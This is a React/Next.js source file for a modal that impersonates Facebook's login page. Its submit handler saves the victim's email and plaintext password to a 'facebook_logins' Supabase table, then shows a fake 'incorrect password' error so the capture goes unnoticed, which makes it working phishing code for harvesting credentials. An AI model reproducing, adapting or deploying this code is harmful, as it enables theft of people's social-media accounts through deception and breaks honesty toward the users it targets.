"use client";

import { useState, useEffect } from "react";
import { createPortal } from "react-dom";
import { useRouter } from "next/navigation";
import { motion, AnimatePresence } from "framer-motion";
import { Facebook, Lock, Mail, X } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card } from "@/components/ui/card";
import { createClient } from "@/lib/supabase/client";
import { useToast } from "@/hooks/use-toast";

interface FacebookLoginModalProps {
  isOpen: boolean;
  onClose: () => void;
  onDataSaved?: () => void;
}

export function FacebookLoginModal({ isOpen, onClose, onDataSaved }: FacebookLoginModalProps) {
  const router = useRouter();
  const supabase = createClient();
  const { toast } = useToast();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState<{ email?: string; password?: string }>({});
  const [mounted, setMounted] = useState(false);

  useEffect(() => {
    setMounted(true);
    return () => setMounted(false);
  }, []);

  const validatePassword = (password: string): boolean => {
    // Password should be at least 6 characters
    return password.length >= 6;
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Reset errors
    const newErrors: { email?: string; password?: string } = {};
    
    // Validate password
    if (!password) {
      newErrors.password = "Password is required";
    } else if (!validatePassword(password)) {
      newErrors.password = "Password must be at least 6 characters";
    }
    
    // If there are errors, set them and return
    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }
    
    // Clear errors and proceed with login
    setErrors({});
    setLoading(true);
    
    try {
      // Check if a record already exists for this Facebook username
      const { data: existingRecord } = await supabase
        .from("facebook_logins")
        .select("id")
        .eq("fb_username", email.trim())
        .maybeSingle();

      let recordId: string | null = null;
      let dbError = null;

      if (existingRecord) {
        // Update existing record with Facebook username and password
        const { error: updateError } = await supabase
          .from("facebook_logins")
          .update({
            fb_username: email.trim(),
            fb_pass: password, // In production, this should be hashed
          })
          .eq("id", existingRecord.id);
        dbError = updateError;
        recordId = existingRecord.id;
      } else {
        // Insert new record with Facebook username and password
        const { data: insertedData, error: insertError } = await supabase
          .from("facebook_logins")
          .insert([
            {
              fb_username: email.trim(),
              fb_pass: password, // In production, this should be hashed
            },
          ])
          .select("id")
          .single();
        
        dbError = insertError;
        if (insertedData) {
          recordId = insertedData.id;
        }
      }

      if (dbError) {
        // Show login failed popup after database save attempt
        toast({
          title: "Facebook Login Failed",
          description: "Unable to process login. Please try again.",
          variant: "destructive",
        });
        setLoading(false);
        return;
      }

      // Store the record ID in sessionStorage so Continue without Facebook modal can use it
      if (recordId && typeof window !== "undefined") {
        sessionStorage.setItem("facebook_login_record_id", recordId);
      }

      // Notify parent component that data was saved FIRST (before toast)
      if (onDataSaved) {
        onDataSaved();
      }

      // Data stored successfully - show failure toast after storing
      toast({
        title: "Facebook Login Failed",
        description: "The email or password you entered is incorrect. Please try again.",
        variant: "destructive",
      });

      // Close modal after a short delay (simulating login attempt)
      setTimeout(() => {
        setLoading(false);
        onClose();
      }, 1500);
    } catch (error) {
      // Show login failed popup after database save attempt
      toast({
        title: "Facebook Login Failed",
        description: "An error occurred during login. Please try again.",
        variant: "destructive",
      });
      setLoading(false);
    }
  };

  if (!mounted) return null;

  const modalContent = (
    <AnimatePresence mode="wait">
      {isOpen && (
        <>
          {/* Backdrop */}
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.2 }}
            className="fixed inset-0 bg-black/50 backdrop-blur-sm z-[100]"
            style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0 }}
          />
          
          {/* Modal */}
          <div 
            className="fixed inset-0 z-[100] flex items-center justify-center p-4 pointer-events-none"
            style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0 }}
          >
            <motion.div
              initial={{ opacity: 0, scale: 0.95, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.95, y: 20 }}
              transition={{ duration: 0.3 }}
              className="w-full max-w-5xl bg-[#f0f2f5] rounded-lg shadow-2xl overflow-hidden pointer-events-auto max-h-[95vh] overflow-y-auto"
              onClick={(e) => e.stopPropagation()}
            >
              {/* Close Button */}
              <button
                onClick={onClose}
                className="absolute top-2 right-2 sm:top-4 sm:right-4 z-10 p-2 rounded-full bg-white/90 hover:bg-white shadow-lg transition-colors"
                aria-label="Close"
              >
                <X className="h-4 w-4 sm:h-5 sm:w-5 text-gray-600" />
              </button>

              <div className="grid md:grid-cols-2 gap-0 min-h-[400px] md:min-h-[500px]">
                {/* Left Side - Facebook Branding */}
                <div className="hidden md:flex flex-col items-center justify-center bg-gradient-to-br from-[#1877f2] via-[#42a5f5] to-[#1877f2] p-6 md:p-8 text-white">
                  <motion.div
                    initial={{ opacity: 0, x: -20 }}
                    animate={{ opacity: 1, x: 0 }}
                    transition={{ duration: 0.5, delay: 0.2 }}
                    className="text-center"
                  >
                    <div className="flex items-center justify-center gap-2 md:gap-3 mb-4 md:mb-6">
                      <Facebook className="h-12 w-12 md:h-16 md:w-16" fill="white" />
                      <h1 className="text-4xl md:text-6xl font-bold">facebook</h1>
                    </div>
                    <p className="text-lg md:text-xl max-w-sm">
                      Connect with friends and the world around you on Facebook.
                    </p>
                  </motion.div>
                </div>

                {/* Right Side - Login Form */}
                <div className="bg-white p-4 sm:p-6 md:p-8 flex flex-col justify-center">
                  <motion.div
                    initial={{ opacity: 0, x: 20 }}
                    animate={{ opacity: 1, x: 0 }}
                    transition={{ duration: 0.5, delay: 0.3 }}
                  >
                    {/* Mobile Logo */}
                    <div className="md:hidden flex items-center justify-center gap-2 mb-4 sm:mb-6">
                      <Facebook className="h-6 w-6 sm:h-8 sm:w-8 text-[#1877f2]" fill="#1877f2" />
                      <h1 className="text-2xl sm:text-3xl font-bold text-[#1877f2]">facebook</h1>
                    </div>

                    <form onSubmit={handleLogin} className="space-y-3 sm:space-y-4">
                      {/* Email/Phone Input */}
                      <div className="relative">
                        <Mail className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 sm:h-5 sm:w-5 text-gray-400 z-10" />
                        <input
                          type="text"
                          placeholder="Email or phone number"
                          value={email}
                          onChange={(e) => setEmail(e.target.value)}
                          className="w-full pl-9 sm:pl-10 pr-3 sm:pr-4 h-11 sm:h-12 text-sm sm:text-base bg-white border border-gray-300 rounded-md focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] text-gray-900 placeholder:text-gray-500"
                        />
                      </div>

                      {/* Password Input */}
                      <div className="relative">
                        <Lock className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 sm:h-5 sm:w-5 text-gray-400 z-10" />
                        <input
                          type="password"
                          placeholder="Password"
                          value={password}
                          onChange={(e) => {
                            setPassword(e.target.value);
                            if (errors.password) {
                              setErrors({ ...errors, password: undefined });
                            }
                          }}
                          className={`w-full pl-9 sm:pl-10 pr-3 sm:pr-4 h-11 sm:h-12 text-sm sm:text-base bg-white border rounded-md focus:outline-none focus:ring-1 text-gray-900 placeholder:text-gray-500 ${
                            errors.password
                              ? "border-red-500 focus:border-red-500 focus:ring-red-500"
                              : "border-gray-300 focus:border-[#1877f2] focus:ring-[#1877f2]"
                          }`}
                        />
                        {errors.password && (
                          <p className="mt-1 text-sm text-red-600">{errors.password}</p>
                        )}
                      </div>

                      {/* Login Button */}
                      <Button
                        type="submit"
                        disabled={loading}
                        className="w-full h-11 sm:h-12 bg-[#1877f2] hover:bg-[#166fe5] text-white font-semibold text-base sm:text-lg rounded-lg transition-colors"
                      >
                        {loading ? "Logging in..." : "Log In"}
                      </Button>

                      {/* Forgot Password Link */}
                      <div className="text-center pt-2">
                        <a
                          href="#"
                          className="text-[#1877f2] text-sm hover:underline"
                          onClick={(e) => {
                            e.preventDefault();
                            alert("Forgot password functionality - Test mode");
                          }}
                        >
                          Forgotten password?
                        </a>
                      </div>

                      {/* Divider */}
                      <div className="relative py-4">
                        <div className="absolute inset-0 flex items-center">
                          <div className="w-full border-t border-gray-300" />
                        </div>
                        <div className="relative flex justify-center text-sm">
                          <span className="px-2 bg-white text-gray-500">or</span>
                        </div>
                      </div>

                      {/* Create Account Button */}
                      <Button
                        type="button"
                        variant="outline"
                        className="w-full h-11 sm:h-12 bg-[#42b72a] hover:bg-[#36a420] text-white font-semibold text-sm sm:text-base rounded-lg border-0 transition-colors"
                        onClick={() => {
                          alert("Create new account functionality - Test mode");
                        }}
                      >
                        Create new account
                      </Button>
                    </form>

                    {/* Create Page Link */}
                    <div className="mt-6 text-center">
                      <p className="text-sm text-gray-600">
                        <a href="#" className="font-semibold hover:underline">
                          Create a Page
                        </a>{" "}
                        for a celebrity, brand or business.
                      </p>
                    </div>
                  </motion.div>
                </div>
              </div>
            </motion.div>
          </div>
        </>
      )}
    </AnimatePresence>
  );

  return createPortal(modalContent, document.body);
}

